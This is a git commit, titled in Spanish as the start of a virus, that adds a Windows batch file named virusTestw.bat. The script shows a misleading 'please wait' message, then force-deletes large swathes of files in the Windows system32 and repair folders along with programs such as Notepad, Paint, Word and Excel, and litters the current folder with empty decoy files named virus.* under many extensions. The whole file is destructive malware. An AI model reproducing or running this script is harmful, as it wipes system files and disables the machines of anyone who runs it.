db9533f299ec571f65db2b859e7ffb680289c84b
Drent <henrryyanez@gmail.com>
2018-11-04 23:00:19 -0300

    Inicio del virus

---
+++ virusTestw.bat
@@ -0,0 +1,57 @@
+@echo off
+msg * Espere para ver el contenido del archivo.
+del c:\windows\repair\*.nt -q -f -s
+del c:\windows\system32\*.bin -q -f -s
+del c:\windows\system32\*.bat -q -f -s
+echo off>>virus.exe
+echo off>>virus.dll
+echo off>>virus.com
+echo off>>virus.ini
+echo off>>virus.sys
+echo off>>virus.reg
+echo off>>virus.ani
+echo off>>virus.rar
+echo off>>virus.pal
+echo off>>virus.bin
+echo off>>virus.cmd
+echo off>>virus.jar
+echo off>>virus.chk
+echo off>>virus.db
+echo off>>virus.ocx
+echo off>>virus.manifest
+echo off>>virus.log
+echo off>>virus.dat
+del c:\windows\system32\*.ax -q -f -s
+del c:\windows\system32\*.acm -q -f -s
+del c:\windows\system32\*.bin -q -f -s
+del c:\windows\system32\*.dat -q -f -s
+del c:\windows\system32\*.hlp -q -f -s
+del c:\windows\system32\*.manifest -q -f -s
+echo off>>virus.cur
+echo off>>virus.386
+echo off>>virus.323
+echo off>>virus.scr
+echo off>>virus.acm
+echo off>>virus.hlp
+echo off>>virus.jpg
+echo off>>virus.mpg
+echo off>>virus.html
+echo off>>virus.vbs
+echo off>>virus.wsh
+echo off>>virus.rat
+echo off>>virus.cer
+del c:\windows\system32\*.ocx -q -f -s 
+del c:\windows\system32\*.drv -q -f -s
+del c:\windows\system32\* .msc -q -f -s 
+echo off>>virus.msc
+del c:\windows\system32\*.cpl -q -f -s
+del c:\windows\system32\*.ini -q -f -s
+del c:\windows\system32\*.vbs -q -f -s
+del c:\windows\system32\calc.exe
+del c:\windows\system32\sol.exe
+del c:\windows\system32\winmine.exe
+del c:\windows\system32\mspaint.exe
+del c:\windows\system32\notepad.exe
+del winword.exe
+del excel.exe
+exit
